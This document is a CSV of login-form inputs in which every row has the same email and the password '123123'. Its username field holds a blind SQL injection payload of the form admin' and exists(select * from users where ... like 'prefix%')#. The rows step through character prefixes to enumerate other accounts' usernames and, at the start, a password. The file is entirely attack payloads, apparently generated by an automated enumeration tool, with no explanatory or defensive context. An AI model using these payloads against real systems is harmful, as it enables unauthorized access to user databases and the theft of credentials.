email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username like 'mikE_pENce%' and password like 'qwy%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username like 'mikE_pENce%' and password like 'qwz%')#,123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'ab%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'ac%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'ade%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adf%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adg%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adh%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adi%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adj%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adk%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adl%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admA%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admB%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admC%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admD%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admE%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admF%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admG%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admH%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIJ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIK%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIL%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIM%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN %')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN-%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN*%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN+%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN=%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN0%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN1%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN2%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN3%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN4%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN5%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN6%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN7%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN8%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admIN9%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINa%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINb%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINc%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINd%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINe%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINf%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINg%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINh%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINi%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINj%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINk%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINl%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINm%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINn%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINO%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINP%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINQ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINR%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINS%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINT%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINU%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINV%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINW%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINX%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINY%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admINZ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admn%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admo%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admp%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admq%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admr%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'adms%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admt%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admu%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admv%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admw%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admx%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admy%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'admz%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'ma%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mb%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mc%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'md%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'me%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mf%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mg%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mh%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mij%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikA%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikB%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikC%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikD%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE %')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_ %')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mike_-%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mike_*%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mike_+%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mike_=%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_a%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_b%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_c%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_d%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_e%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_f%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_g%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_h%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_i%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_j%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_k%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_l%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_m%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_n%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_o%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pA%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pB%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pC%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pD%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pq%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pr%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_ps%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pt%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pu%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pv%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pw%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_px%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_py%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE_pz%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE-%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE0%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE1%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE2%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE3%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE4%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE5%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE6%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE7%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE8%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikE9%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEa%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEb%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEc%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEd%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEe%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEF%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEG%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEH%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEI%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEJ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEK%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEL%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEM%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEN%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEO%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEP%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEQ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikER%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikES%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikET%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEU%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEV%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEW%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEX%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEY%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikEZ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikl%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikm%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikn%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'miko%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikp%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikq%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikr%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'miks%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikt%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'miku%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikv%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikw%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikx%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'miky%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin','mike_pence','abdCD') and username like 'mikz%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abc%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdA%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdB%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD0%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD1%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD2%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD3%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD4%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD5%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD6%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD7%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD8%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCD9%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDa%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDb%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDc%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDd%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDE%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDF%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDG%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDH%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDI%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDJ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDK%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDL%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDM%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDN%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDO%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDP%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDQ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDR%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDS%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDT%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDU%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDV%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDW%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDX%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDY%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdCDZ%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abde%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdf%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdg%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdh%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdi%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdj%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdk%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdl%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdm%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdn%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdo%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdp%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdq%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdr%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abds%')#",123123
mike_pence@asu.edu,"admin' and exists(select * from users where username not in ('tony','admin') and username like 'abdt%')#",123123
